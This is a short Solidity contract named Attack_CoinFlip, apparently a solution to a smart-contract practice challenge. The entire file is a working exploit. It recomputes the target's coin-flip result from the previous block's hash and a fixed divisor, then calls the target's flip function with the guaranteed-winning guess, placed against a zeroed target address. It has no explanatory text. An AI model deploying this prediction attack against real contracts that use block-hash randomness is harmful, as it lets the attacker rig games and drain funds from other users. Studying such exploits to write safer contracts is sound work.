// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack_CoinFlip {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Address of the target CoinFlip contract instance
    ICoinFlip target = ICoinFlip(0x0000000000000000000000000000000000000000); // Address of the contract instance

    // Executer function that predicts the coin flip outcome
    function executer() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Call the CoinFlip contract with the predicted result
        target.flip(side);
    }
}

// Interface of the CoinFlip contracte 
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}